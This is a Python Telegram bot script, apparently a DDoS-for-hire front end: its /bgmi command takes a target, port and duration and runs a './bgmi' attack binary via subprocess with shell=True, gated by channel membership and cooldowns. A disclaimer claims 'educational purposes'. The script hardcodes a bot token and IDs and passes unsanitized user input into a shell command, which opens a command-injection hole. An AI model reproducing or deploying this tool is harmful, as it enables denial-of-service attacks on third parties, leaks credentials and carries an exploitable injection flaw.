#i here by declare that i am opening this py and downloading and copy this py with my
#own concern so there so no involvement of channels and admin and owner of channels 
#so that i agree with above statment and take my responsibility for accepting this 
#and i user with full concerns and in my response i have agreed this above term and condition 
#this is only for educational purposes so owner or admin of channels are not responsible 
#thankyou



import telebot
import subprocess
import datetime
import time

# Bot Token
BOT_TOKEN = "7503879369:AAHnKo3GyKPByRaEqG_UYyULARsprFdjfiM"
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs
admin_id = {"6539807903"} #your admin id

# Allowed Groups
ALLOWED_GROUPS = {-1002461599613} #grp chat id

# Required Channels
REQUIRED_CHANNELS = ["@gauravbhaihack"] #channel should be PUBLIC 

# Cooldown Dictionary
attack_cooldown = {}

# Cooldown Time (in seconds)
COOLDOWN_TIME = 300  # 5 minutes


# Function to check if user is a member of required channels
def is_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member_status = bot.get_chat_member(channel, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True


# Handler for /joined command (to verify channel membership)
@bot.message_handler(commands=["joined"])
def verify_membership(message):
    user_id = message.from_user.id

    if is_member(user_id):
        bot.reply_to(message, "✅ You have joined both channels. Now you can use the bot.")
    else:
        bot.reply_to(message, f"❌ You have not joined both channels. Please join {', '.join(REQUIRED_CHANNELS)} first.")


# Handler for /bgmi command (attack)
@bot.message_handler(commands=["bgmi"])
def handle_attack(message):
    global attack_cooldown

    user_id = message.from_user.id
    chat_id = message.chat.id
    current_time = time.time()

    # Check if bot is in an allowed group
    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ This command is only allowed in authorized groups.")
        return

    # Check if user is a member of both required channels
    if not is_member(user_id):
        bot.reply_to(message, f"❌ You must join {', '.join(REQUIRED_CHANNELS)} before using this command. then click /joined to verify")
        return

    # Check cooldown
    if user_id in attack_cooldown and current_time - attack_cooldown[user_id] < COOLDOWN_TIME:
        remaining_time = int(COOLDOWN_TIME - (current_time - attack_cooldown[user_id]))
        bot.reply_to(message, f"⏳ You are on cooldown. Please wait {remaining_time} seconds before using /chodo again.")
        return

    # Parse command arguments
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /bgmi <target> <port> <time>")
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    try:
        port = int(port)
        duration = int(duration)

        if duration > 240:
            bot.reply_to(message, "❌ Error: Time interval must be less than 240 seconds.")
            return

        # Update cooldown time
        attack_cooldown[user_id] = current_time

        # Execute attack (Replace with actual command)
        attack_command = f"./bgmi {target} {port} {duration} 800"
        subprocess.run(attack_command, shell=True)

        bot.reply_to(message, f"🔥 Attack started on {target}:{port} for {duration} seconds.")

    except ValueError:
        bot.reply_to(message, "❌ Error: Port and time must be numbers.")


# Start the bot
bot.polling(none_stop=True)